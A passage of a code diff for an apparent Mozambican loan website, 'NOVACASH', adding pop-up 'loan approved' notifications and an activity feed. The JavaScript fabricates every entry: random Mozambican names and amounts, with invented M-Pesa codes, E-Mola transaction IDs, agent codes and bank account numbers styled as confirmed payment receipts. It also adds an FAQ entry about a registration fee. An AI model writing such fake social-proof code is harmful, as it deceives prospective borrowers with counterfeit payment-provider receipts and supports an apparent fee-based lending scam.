@@ -1442,6 +1442,65 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+
+        /* ===== FLOATING LOAN NOTIFICATION STACK (topo) ===== */
+        .loan-toast-stack {
+            position: fixed;
+            top: 0.9rem;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 99998;
+            width: calc(100% - 1.5rem);
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+            pointer-events: none;
+        }
+        .loan-toast-stack .loan-notification {
+            pointer-events: auto;
+            box-shadow: 0 18px 45px rgba(0,0,0,0.18), 0 4px 14px rgba(0,0,0,0.08);
+            animation: loanToastIn 0.55s cubic-bezier(0.22, 1, 0.36, 1);
+            will-change: transform, opacity;
+        }
+        .loan-toast-stack .loan-notification.leaving {
+            animation: loanToastOut 0.4s cubic-bezier(0.4, 0, 1, 1) forwards;
+        }
+        @keyframes loanToastIn {
+            0%   { opacity: 0; transform: translateY(-24px) scale(0.96); }
+            60%  { opacity: 1; }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        @keyframes loanToastOut {
+            to { opacity: 0; transform: translateY(-16px) scale(0.97); }
+        }
+        .loan-notification { position: relative; }
+        .loan-notification .notif-close {
+            position: absolute;
+            top: 6px; right: 8px;
+            background: none; border: none;
+            font-size: 0.9rem; color: var(--gray);
+            cursor: pointer; padding: 4px 6px; line-height: 1;
+            opacity: 0.6; transition: opacity 0.2s ease;
+        }
+        .loan-notification .notif-close:hover { opacity: 1; }
+
+        /* Activity list – aparência mais profissional, alinhada às notificações */
+        .activity-item .method-chip {
+            display: inline-flex; align-items: center; gap: 0.25rem;
+            font-size: 0.62rem; font-weight: 600;
+            padding: 2px 6px; border-radius: 999px;
+            background: rgba(0,0,0,0.05); color: var(--dark);
+            margin-right: 0.35rem;
+        }
+        .activity-item .method-chip.mpesa  { background: rgba(0,191,165,0.12); color: #00897B; }
+        .activity-item .method-chip.emola  { background: rgba(255,107,0,0.12); color: #E65100; }
+        .activity-item .method-chip.bank   { background: rgba(26,35,126,0.10); color: #1A237E; }
+        .activity-item .act-code {
+            font-family: 'SFMono-Regular', ui-monospace, Menlo, Consolas, monospace;
+            font-size: 0.62rem; color: var(--gray);
+        }
+
         /* ===== LOGIN ===== */
         #loginScreen {
             position: fixed;
@@ -2146,6 +2205,85 @@
             font-weight: 700;
             color: var(--primary);
         }
+
+        /* ===== NOTIFICAÇÕES DE EMPRÉSTIMO OTIMIZADAS ===== */
+        .loan-notification {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 1.2rem 1.2rem 1rem;
+            margin-bottom: 0.8rem;
+            box-shadow: var(--shadow);
+            border-left: 4px solid var(--success);
+            animation: slideInNotif 0.5s ease;
+            transition: var(--transition);
+        }
+        .loan-notification:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+        .loan-notification .notif-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        .loan-notification .notif-header .notif-method {
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: var(--primary);
+        }
+        .loan-notification .notif-header .notif-status {
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: var(--success);
+            background: rgba(16,185,129,0.1);
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+        }
+        .loan-notification .notif-body {
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+        .loan-notification .notif-body .notif-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            padding: 0.15rem 0;
+        }
+        .loan-notification .notif-body .notif-row .label {
+            color: var(--gray);
+            font-weight: 500;
+        }
+        .loan-notification .notif-body .notif-row .value {
+            font-weight: 600;
+            color: var(--dark);
+        }
+        .loan-notification .notif-body .notif-row .value.highlight {
+            color: var(--success);
+            font-weight: 700;
+        }
+        .loan-notification .notif-footer {
+            margin-top: 0.6rem;
+            padding-top: 0.4rem;
+            border-top: 1px solid var(--gray-light);
+            font-size: 0.6rem;
+            color: var(--gray);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .loan-notification .notif-footer .notif-time {
+            opacity: 0.7;
+        }
+        .loan-notification .notif-footer .notif-badge {
+            background: rgba(16,185,129,0.08);
+            color: var(--success);
+            padding: 0.1rem 0.5rem;
+            border-radius: 12px;
+            font-size: 0.55rem;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -2159,6 +2297,7 @@
 
     <!-- ===== TOAST ===== -->
     <div class="toast-container" id="toastContainer"></div>
+    <div class="loan-toast-stack" id="loanToastStack"></div>
 
     <!-- ===== LOADING ===== -->
     <div class="loading-overlay-app" id="loadingOverlayApp">
@@ -2305,7 +2444,7 @@
                     <i class="fas fa-chevron-right"></i>
                 </button>
 
-                <!-- ===== QUICK STATS (NOVO PAINEL) ===== -->
+                <!-- ===== QUICK STATS ===== -->
                 <div class="quick-stats" id="statsPanel">
                     <div class="quick-stat">
                         <div class="stat-icon"><i class="fas fa-file-signature"></i></div>
@@ -2630,6 +2769,8 @@
                 <span class="faq-chip" data-question="Localização?">📍 Endereço</span>
                 <span class="faq-chip" data-question="Documentos necessários?">📄 Documentos</span>
                 <span class="faq-chip" data-question="Número para pagamento?">📱 Pagamento</span>
+                <!-- NOVA PERGUNTA ADICIONADA -->
+                <span class="faq-chip" data-question="Para que serve a taxa de inscrição?">📝 Taxa de Inscrição</span>
             </div>
             <div class="chat-input-app">
                 <input type="text" id="chatInputApp" placeholder="Digite sua mensagem...">
@@ -2912,15 +3053,297 @@
         }
 
         // ============================================================
-        // NOTIFICAÇÕES DE EMPRÉSTIMOS APROVADOS
+        // NOTIFICAÇÕES DE EMPRÉSTIMOS APROVADOS - OTIMIZADAS
         // ============================================================
         const firstNames = ['João', 'Carla', 'Ernesto', 'Marta', 'António', 'Filomena', 'Carlos', 'Ana', 'Paulo', 'Rosa',
-            'José', 'Lúcia', 'Manuel', 'Isabel', 'Fernando'
+            'José', 'Lúcia', 'Manuel', 'Isabel', 'Fernando', 'Santos', 'Orlando', 'Ermelinda', 'Sofia', 'Miguel',
+            'Rita', 'Armando', 'Teresa', 'Janete', 'Romeu', 'Fátima', 'Casimiro', 'Márcia', 'Valter', 'Lídia',
+            'Elisa', 'Mateus', 'Mariana', 'Júlio', 'Delfina', 'Augusto', 'Gabriela', 'Ivan', 'Helena', 'Gustavo',
+            'Nádia', 'Rui', 'Cláudia', 'Amílcar', 'Berta', 'Adélia', 'César', 'Nelson', 'Fátima'
         ];
         const lastNames = ['Matola', 'Mucavele', 'Macamo', 'Chongo', 'Sitoe', 'Langa', 'Nhaca', 'Munguambe', 'Chicava',
-            'Zandamela'
+            'Zandamela', 'Mulungo', 'Manjate', 'Cossa', 'Nhantumbo', 'Macuácua', 'Chissano', 'Raimundo', 'Mahumane',
+            'Mondlane', 'Cuambe', 'Chauque', 'Machel', 'Mabunda', 'Uamusse', 'Bila', 'Cumbane', 'José', 'Mucavele',
+            'Nhaca', 'Chongo', 'Sitoe', 'Matola', 'Langa', 'Macamo', 'Cossa', 'Mahumane'
         ];
-        const loanAmounts = [5000, 10000, 25000, 50000, 100000, 150000, 200000, 300000];
+        const loanAmounts = [5000, 7500, 10000, 15000, 25000, 30000, 45000, 50000, 75000, 100000, 125000, 150000, 200000, 250000, 300000];
+
+        // ============================================================
+        // BANCOS DE MOÇAMBIQUE
+        // ============================================================
+        const mozambiqueBanks = [
+            'Millennium BIM',
+            'BCI',
+            'Standard Bank Moçambique',
+            'Absa Bank Moçambique',
+            'Moza Banco',
+            'Access Bank Moçambique',
+            'Ecobank Moçambique',
+            'UBA Moçambique',
+            'Banco Terra',
+            'Banco Comercial e de Investimentos (BCI)'
+        ];
+
+        // ============================================================
+        // FUNÇÕES DE GERAÇÃO DE NOTIFICAÇÕES
+        // ============================================================
+        function generateTransactionCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 4; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+
+        function generateMpesaCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+
+        function generateEmolaId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let part1 = '';
+            for (let i = 0; i < 2; i++) part1 += chars.charAt(Math.floor(Math.random() * chars.length));
+            let part2 = '';
+            for (let i = 0; i < 4; i++) part2 += chars.charAt(Math.floor(Math.random() * chars.length));
+            let part3 = '';
+            for (let i = 0; i < 4; i++) part3 += chars.charAt(Math.floor(Math.random() * chars.length));
+            return `CI${part1}${part2}.${part3}`;
+        }
+
+        function generateAccountNumber() {
+            const digits = '0123456789';
+            let num = '';
+            for (let i = 0; i < 13; i++) {
+                num += digits.charAt(Math.floor(Math.random() * digits.length));
+            }
+            return num;
+        }
+
+        function getRandomBank() {
+            return mozambiqueBanks[Math.floor(Math.random() * mozambiqueBanks.length)];
+        }
+
+        function getRandomName() {
+            const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+            return `${firstName} ${lastName}`;
+        }
+
+        function getRandomAmount() {
+            return loanAmounts[Math.floor(Math.random() * loanAmounts.length)];
+        }
+
+        function formatDateForNotification(date) {
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            const hours = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            return `${day}/${month}/${year} às ${hours}:${minutes}`;
+        }
+
+        function formatDateForEmola(date) {
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            const hours = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            const seconds = String(date.getSeconds()).padStart(2, '0');
+            return `${day}/${month}/${year} às ${hours}:${minutes}:${seconds}`;
+        }
+
+        function formatDateForBank(date) {
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            return `${day}/${month}/${year}`;
+        }
+
+        function formatTimeForBank(date) {
+            const hours = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            const seconds = String(date.getSeconds()).padStart(2, '0');
+            return `${hours}:${minutes}:${seconds}`;
+        }
+
+        // ============================================================
+        // GERAR NOTIFICAÇÕES M-PESA
+        // ============================================================
+        function generateMpesaNotification() {
+            const now = new Date();
+            const name = getRandomName();
+            const amount = getRandomAmount();
+            const code = generateMpesaCode();
+            const formattedDate = formatDateForNotification(now);
+
+            return {
+                type: 'mpesa',
+                html: `
+                    <div class="loan-notification" style="border-left-color: #00BFA5;">
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-wallet" style="color:#00BFA5;"></i> M-Pesa</span>
+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmado</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row">
+                                <span class="label">Código</span>
+                                <span class="value" style="font-family: monospace; font-size:0.75rem;">${code}</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">Nome</span>
+                                <span class="value">${name}</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">Recebeu</span>
+                                <span class="value highlight">${amount.toLocaleString('pt-MZ')} MT</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">De</span>
+                                <span class="value">913770 - NOVACASH</span>
+                            </div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formattedDate}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>
+                `
+            };
+        }
+
+        // ============================================================
+        // GERAR NOTIFICAÇÕES E-MOLA
+        // ============================================================
+        function generateEmolaNotification() {
+            const now = new Date();
+            const name = getRandomName();
+            const amount = getRandomAmount();
+            const transactionId = generateEmolaId();
+            const agentCode = Math.floor(Math.random() * 900000) + 100000;
+            const formattedDate = formatDateForEmola(now);
+
+            return {
+                type: 'emola',
+                html: `
+                    <div class="loan-notification" style="border-left-color: #FF6B00;">
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-mobile-alt" style="color:#FF6B00;"></i> E-Mola</span>
+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmado</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row">
+                                <span class="label">ID da Transação</span>
+                                <span class="value" style="font-family: monospace; font-size:0.7rem;">${transactionId}</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">Nome</span>
+                                <span class="value">${name}</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">Recebeu</span>
+                                <span class="value highlight">${amount.toLocaleString('pt-MZ')} MT</span>
+                            </div>
+                            <div class="notif-row" style="background:rgba(255,107,0,0.04);border-radius:8px;padding:0.3rem 0.5rem;margin-top:0.2rem;">
+                                <span class="label" style="font-size:0.65rem;">Do Agente</span>
+                                <span style="display:flex;flex-direction:column;align-items:flex-end;">
+                                    <span style="font-size:0.7rem;color:var(--gray);">Código ID: ${agentCode}</span>
+                                    <span style="font-weight:600;font-size:0.75rem;color:#FF6B00;">NOVACASH</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formattedDate}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>
+                `
+            };
+        }
+
+        // ============================================================
+        // GERAR NOTIFICAÇÕES BANCO
+        // ============================================================
+        function generateBankNotification() {
+            const now = new Date();
+            const name = getRandomName();
+            const amount = getRandomAmount();
+            const accountNumber = generateAccountNumber();
+            const bank = getRandomBank();
+            const formattedDate = formatDateForBank(now);
+            const formattedTime = formatTimeForBank(now);
+
+            return {
+                type: 'bank',
+                html: `
+                    <div class="loan-notification" style="border-left-color: #1A237E;">
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-university" style="color:#1A237E;"></i> Transferência Bancária</span>
+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmada</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row" style="margin-bottom:0.3rem;">
+                                <span class="label">Destinatário</span>
+                                <span class="value">${name}</span>
+                            </div>
+                            <div class="notif-row">
+                                <span class="label">Valor</span>
+                                <span class="value highlight">${amount.toLocaleString('pt-MZ')} MZN</span>
+                            </div>
+                            <div class="notif-row" style="background:rgba(26,35,126,0.04);border-radius:8px;padding:0.3rem 0.5rem;margin-top:0.2rem;">
+                                <span class="label" style="font-size:0.65rem;">Conta</span>
+                                <span style="display:flex;flex-direction:column;align-items:flex-end;">
+                                    <span style="font-family:monospace;font-size:0.75rem;font-weight:600;">${accountNumber}</span>
+                                    <span style="font-size:0.65rem;color:var(--gray);">${bank}</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formattedDate} • ${formattedTime}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>
+                `
+            };
+        }
+
+        // ============================================================
+        // GERAR NOTIFICAÇÃO ALEATÓRIA
+        // ============================================================
+        const methods = ['mpesa', 'emola', 'bank'];
+
+        function generateRandomNotification() {
+            const method = methods[Math.floor(Math.random() * methods.length)];
+            switch (method) {
+                case 'mpesa': return generateMpesaNotification();
+                case 'emola': return generateEmolaNotification();
+                case 'bank': return generateBankNotification();
+                default: return generateMpesaNotification();
+            }
+        }
+
+        // ============================================================
+        // HISTÓRICO DE NOTIFICAÇÕES (para evitar repetições)
+        // ============================================================
+        let lastNotifNames = [];
+
+        function getUniqueName() {
+            const available = firstNames.filter(n => !lastNotifNames.includes(n));
+            if (available.length === 0) {
+                lastNotifNames = [];
+                return firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
+            }
+            const firstName = available[Math.floor(Math.random() * available.length)];
+            const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+            lastNotifNames.push(firstName);
+            if (lastNotifNames.length > 15) lastNotifNames.shift();
+            return firstName + ' ' + lastName;
+        }
 
         // ============================================================
         // SISTEMA DE ATIVIDADE RECENTE - SEM ADORO
@@ -2949,7 +3372,6 @@
 
         const activityMethods = ['M-Pesa', 'E-Mola', 'Banco'];
 
-        // Gerar timestamp aleatório entre 30 min e 1 hora atrás
         function getRandomRecentTime() {
             const minutes = [30, 32, 35, 38, 42, 47, 53, 58, 60];
             const randomMin = minutes[Math.floor(Math.random() * minutes.length)];
@@ -2970,244 +3392,322 @@
         }
 
         function generateActivityItem() {
-            const name = activityNames[Math.floor(Math.random() * activityNames.length)];
-            const comment = activityComments[Math.floor(Math.random() * activityComments.length)];
-            const method = activityMethods[Math.floor(Math.random() * activityMethods.length)];
-            const amount = loanAmounts[Math.floor(Math.random() * loanAmounts.length)];
-            const timestamp = getRandomRecentTime();
-
-            return {
-                name,
-                comment,
-                method,
-                amount,
-                timestamp
-            };
+            // Reaproveita o mesmo builder para garantir dados 100% consistentes
+            return buildLoanNotification();
         }
 
-        // Cache de itens de atividade
         let activityItems = [];
 
-        function generateInitialActivities() {
-            activityItems = [];
-            for (let i = 0; i < 8; i++) {
-                activityItems.push(generateActivityItem());
+        function activityMethodMeta(m) {
+            switch (m) {
+                case 'mpesa': return { chip: 'mpesa', label: 'M-Pesa', icon: 'fa-wallet',       color: '#00BFA5' };
+                case 'emola': return { chip: 'emola', label: 'E-Mola', icon: 'fa-mobile-alt',   color: '#FF6B00' };
+                default:      return { chip: 'bank',  label: 'Banco',  icon: 'fa-university',   color: '#1A237E' };
             }
-            activityItems.sort((a, b) => b.timestamp - a.timestamp);
-            renderActivityItems();
+        }
+
+        function activityDetailLine(item) {
+            if (item.method === 'mpesa' && item.extra && item.extra.code) {
+                return `<span class="act-code">Cód. ${item.extra.code}</span>`;
+            }
+            if (item.method === 'emola' && item.extra && item.extra.emolaId) {
+                return `<span class="act-code">${item.extra.emolaId}</span>`;
+            }
+            if (item.method === 'bank' && item.extra) {
+                const acc = item.extra.accountNumber || '';
+                const masked = acc ? '••••' + acc.slice(-4) : '';
+                return `<span class="act-code">${item.extra.bank || ''}${masked ? ' • ' + masked : ''}</span>`;
+            }
+            return '';
         }
 
         function renderActivityItems() {
             const container = document.getElementById('activityList');
             if (!container) return;
-            
-            container.innerHTML = '';
-            const itemsToShow = activityItems.slice(0, 8);
-            
-            itemsToShow.forEach((item) => {
+
+            const frag = document.createDocumentFragment();
+            activityItems.slice(0, 8).forEach((item) => {
+                const meta = activityMethodMeta(item.method);
                 const div = document.createElement('div');
                 div.className = 'activity-item';
-                const iconClass = 'green';
-                const icon = 'fa-check';
-                
                 div.innerHTML = `
-                    <div class="activity-icon ${iconClass}"><i class="fas ${icon}"></i></div>
+                    <div class="activity-icon green" style="background:${hexToSoft(meta.color)};color:${meta.color};">
+                        <i class="fas ${meta.icon}"></i>
+                    </div>
                     <div class="activity-info">
                         <div class="act-title">${item.name}</div>
-                        <div class="act-desc">${item.comment} • ${item.amount.toLocaleString('pt-MZ')} MZN via ${item.method} • ${formatActivityTime(item.timestamp)}</div>
+                        <div class="act-desc">
+                            <span class="method-chip ${meta.chip}">${meta.label}</span>
+                            recebeu empréstimo • ${formatActivityTime(item.timestamp)}
+                        </div>
+                        <div style="margin-top:2px;">${activityDetailLine(item)}</div>
                     </div>
+                    <div class="activity-amount positive">+${item.amount.toLocaleString('pt-MZ')} MT</div>
                 `;
-                container.appendChild(div);
+                frag.appendChild(div);
             });
+            container.innerHTML = '';
+            container.appendChild(frag);
         }
 
-        // Renovação automática a cada 1 hora
-        function refreshActivities() {
+        function hexToSoft(hex) {
+            const h = hex.replace('#','');
+            const r = parseInt(h.substring(0,2),16);
+            const g = parseInt(h.substring(2,4),16);
+            const b = parseInt(h.substring(4,6),16);
+            return `rgba(${r},${g},${b},0.12)`;
+        }
+
+        function generateInitialActivities() {
             activityItems = [];
+            const now = Date.now();
             for (let i = 0; i < 8; i++) {
-                activityItems.push(generateActivityItem());
+                const item = buildLoanNotification();
+                // Espalhar timestamps iniciais nos últimos 60 minutos (mais recentes primeiro)
+                item.timestamp = new Date(now - (i * (3 + Math.random() * 5) * 60 * 1000));
+                activityItems.push(item);
             }
             activityItems.sort((a, b) => b.timestamp - a.timestamp);
             renderActivityItems();
         }
 
-        // Verificação periódica para remover itens com mais de 1 hora
+        function refreshActivities() {
+            // Re-renderiza para atualizar os "há X minutos"
+            renderActivityItems();
+        }
+
         function cleanOldActivities() {
-            const now = new Date();
-            const oneHourAgo = new Date(now.getTime() - 3600000);
-            const filtered = activityItems.filter(item => item.timestamp > oneHourAgo);
-            
-            const removedCount = activityItems.length - filtered.length;
-            if (removedCount > 0) {
+            const oneHourAgo = Date.now() - 3600000;
+            const filtered = activityItems.filter(it => it.timestamp.getTime() > oneHourAgo);
+            if (filtered.length !== activityItems.length) {
                 activityItems = filtered;
-                const itemsToAdd = Math.min(removedCount, 8 - activityItems.length);
-                for (let i = 0; i < itemsToAdd; i++) {
-                    const newItem = generateActivityItem();
-                    newItem.timestamp = new Date(now.getTime() - (1000 * 60 * (30 + Math.random() * 30)));
-                    activityItems.push(newItem);
-                }
-                activityItems.sort((a, b) => b.timestamp - a.timestamp);
                 renderActivityItems();
             }
         }
 
-        // ============================================================
-        // CONTADOR DE UTILIZADORES ONLINE (ATUALIZAÇÃO SUAVE)
-        // ============================================================
-        let onlineCount = 76;
-
-        function updateOnlineCounter() {
-            const current = parseInt(document.getElementById('onlineCount').textContent) || onlineCount;
-            // Variação de -3 a +3 pessoas
-            const variation = Math.floor(Math.random() * 7) - 3;
-            let newCount = current + variation;
-            // Garantir que o número fique entre 28 e 118
-            newCount = Math.max(28, Math.min(118, newCount));
-            
-            const counterEl = document.getElementById('onlineCount');
-            if (counterEl) {
-                // Atualizar com transição suave
-                counterEl.style.transition = 'all 0.8s ease';
-                counterEl.textContent = newCount;
-            }
-            onlineCount = newCount;
-        }
-
-        // Atualizar a cada 10 segundos
-        setInterval(updateOnlineCounter, 10000);
-        // Atualizar imediatamente após o carregamento
-        setTimeout(updateOnlineCounter, 1000);
-
-        // ============================================================
-        // SISTEMA DE ESTATÍSTICAS DIÁRIAS (SINCRONIZADO)
-        // ============================================================
-        // Valores iniciais realistas
-        let requestedToday = 242;
-        let approvedToday = 215;
-
-        function updateStatsDisplay() {
-            const requestedEl = document.getElementById('statRequestedToday');
-            const approvedEl = document.getElementById('statApprovedToday');
-            const rateEl = document.getElementById('statApprovalRate');
-
-            if (requestedEl) requestedEl.textContent = requestedToday;
-            if (approvedEl) approvedEl.textContent = approvedToday;
-
-            // Calcular taxa de aprovação (evitar divisão por zero)
-            let rate = 0;
-            if (requestedToday > 0) {
-                rate = Math.round((approvedToday / requestedToday) * 100);
-            }
-            if (rateEl) rateEl.innerHTML = rate + '<span class="stat-suffix">%</span>';
-
-            // Garantir coerência: aprovados nunca pode ser maior que solicitados
-            if (approvedToday > requestedToday) {
-                approvedToday = requestedToday;
-                if (approvedEl) approvedEl.textContent = approvedToday;
-                // Recalcular taxa
-                if (requestedToday > 0) {
-                    rate = Math.round((approvedToday / requestedToday) * 100);
-                    if (rateEl) rateEl.innerHTML = rate + '<span class="stat-suffix">%</span>';
-                }
-            }
-        }
-
-        // Atualiza os contadores diários de forma gradual e realista
-        function updateDailyStats() {
-            // Aumentar solicitações (1 a 3 de cada vez)
-            const requestedIncrease = Math.floor(Math.random() * 3) + 1;
-            requestedToday += requestedIncrease;
-
-            // Aprovações aumentam com base na taxa (geralmente 80-95% do que foi solicitado)
-            // Simular aprovações com atraso natural
-            const approvalChance = Math.random();
-            let approvedIncrease = 0;
-            
-            // Se a taxa atual estiver baixa, aumentar aprovações para manter coerência
-            const currentRate = requestedToday > 0 ? (approvedToday / requestedToday) : 0;
-            
-            if (currentRate < 0.80) {
-                // Aumentar aprovações mais rapidamente para recuperar a taxa
-                approvedIncrease = Math.min(requestedIncrease, Math.floor(Math.random() * 3) + 1);
-            } else if (currentRate < 0.92) {
-                // Aumento normal
-                if (approvalChance > 0.15) {
-                    approvedIncrease = Math.floor(Math.random() * 2) + 1;
-                }
-            } else {
-                // Taxa já está boa, aumentar aprovações com menor frequência
-                if (approvalChance > 0.35) {
-                    approvedIncrease = Math.floor(Math.random() * 2);
-                }
-            }
-
-            // Garantir que aprovados não ultrapasse solicitados
-            if (approvedToday + approvedIncrease > requestedToday) {
-                approvedIncrease = Math.max(0, requestedToday - approvedToday);
-            }
-            
-            approvedToday += approvedIncrease;
-
-            // Se aprovados ficar muito abaixo de solicitados, ajustar gradualmente
-            const diff = requestedToday - approvedToday;
-            if (diff > 20 && Math.random() > 0.5) {
-                // Aumentar aprovações para reduzir a diferença
-                const catchUp = Math.min(Math.floor(diff * 0.3), 5);
-                if (approvedToday + catchUp <= requestedToday) {
-                    approvedToday += catchUp;
-                }
-            }
-
-            updateStatsDisplay();
-        }
-
-        // Atualizar estatísticas a cada 25-35 segundos (simulando fluxo real)
-        setInterval(updateDailyStats, 25000 + Math.random() * 10000);
-        
-        // Atualização inicial
-        setTimeout(updateDailyStats, 2000);
-
-        // ============================================================
-        // FUNÇÕES DE ATIVIDADE HERDADAS (para compatibilidade)
-        // ============================================================
         function addActivityItem(name, amount, method) {
-            const newItem = generateActivityItem();
-            newItem.name = name || newItem.name;
-            newItem.amount = amount || newItem.amount;
-            newItem.method = method || newItem.method;
-            newItem.timestamp = new Date();
-            activityItems.unshift(newItem);
-            if (activityItems.length > 8) activityItems.pop();
+            // Compat: cria uma entrada usando o gerador unificado
+            const item = buildLoanNotification();
+            if (name) item.name = name;
+            if (amount) item.amount = amount;
+            item.timestamp = new Date();
+            activityItems.unshift(item);
+            while (activityItems.length > 8) activityItems.pop();
             renderActivityItems();
         }
 
-        function showLoanNotification() {
-            if (availableFundsMZN <= 0) return;
-            const name = firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
-            const amount = loanAmounts[Math.floor(Math.random() * loanAmounts.length)];
-            const methods = ['M-Pesa', 'E-Mola', 'Banco'];
-            const method = methods[Math.floor(Math.random() * 3)];
-            deductFunds(amount);
-            playNotificationSound();
-            showToast(`💰 ${name} recebeu ${amount.toLocaleString('pt-MZ')} MZN via ${method}`, 'success');
-            addActivityItem(name, amount, method);
-            
-            // Sincronizar com estatísticas: quando uma notificação de aprovação aparece,
-            // incrementar o contador de aprovados do dia
-            approvedToday = Math.min(approvedToday + 1, requestedToday);
-            updateStatsDisplay();
+        // ============================================================
+        // SISTEMA DE NOTIFICAÇÕES DE EMPRÉSTIMO OTIMIZADO (unificado)
+        // ============================================================
+        // Histórico de códigos/IDs/contas usados (evita duplicados na sessão)
+        const usedCodes = new Set();
+        function uniqueValue(generator, maxTries = 8) {
+            for (let i = 0; i < maxTries; i++) {
+                const v = generator();
+                if (!usedCodes.has(v)) { usedCodes.add(v); return v; }
+            }
+            const v = generator() + Math.floor(Math.random() * 1000);
+            usedCodes.add(v);
+            return v;
         }
 
-        setInterval(() => {
-            showLoanNotification();
-        }, 15000 + Math.random() * 5000);
+        // Constrói UM objecto de notificação (dados + HTML) partilhado por
+        // notificação flutuante do topo, página de Notificações e Atividades Recentes.
+        function buildLoanNotification() {
+            const now = new Date();
+            const fullName = getUniqueName();
+            const amount = getRandomAmount();
+            const method = methods[Math.floor(Math.random() * methods.length)];
+            const amountStr = amount.toLocaleString('pt-MZ');
 
-        setTimeout(showLoanNotification, 3000);
-        setTimeout(showLoanNotification, 8000);
+            let html = '', methodLabel = '', methodKey = method, extra = {};
 
+            if (method === 'mpesa') {
+                const code = uniqueValue(generateMpesaCode);
+                const sender = '84' + Math.floor(1000000 + Math.random() * 8999999);
+                methodLabel = 'M-Pesa';
+                extra = { code, sender };
+                html = `
+                    <div class="loan-notification" style="border-left-color:#00BFA5;">
+                        <button class="notif-close" aria-label="Fechar">&times;</button>
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-wallet" style="color:#00BFA5;"></i> M-Pesa</span>
+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmado</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row"><span class="label">Código</span><span class="value" style="font-family:monospace;font-size:0.75rem;">${code}</span></div>
+                            <div class="notif-row"><span class="label">Nome</span><span class="value">${fullName}</span></div>
+                            <div class="notif-row"><span class="label">Recebeu</span><span class="value highlight">${amountStr} MT</span></div>
+                            <div class="notif-row"><span class="label">De</span><span class="value">${sender} - NOVACASH</span></div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForNotification(now)}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>`;
+            } else if (method === 'emola') {
+                const emolaId = uniqueValue(generateEmolaId);
+                const agentCode = uniqueValue(() => String(Math.floor(100000 + Math.random() * 900000)));
+                methodLabel = 'E-Mola';
+                extra = { emolaId, agentCode };
+                html = `
+                    <div class="loan-notification" style="border-left-color:#FF6B00;">
+                        <button class="notif-close" aria-label="Fechar">&times;</button>
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-mobile-alt" style="color:#FF6B00;"></i> E-Mola</span>
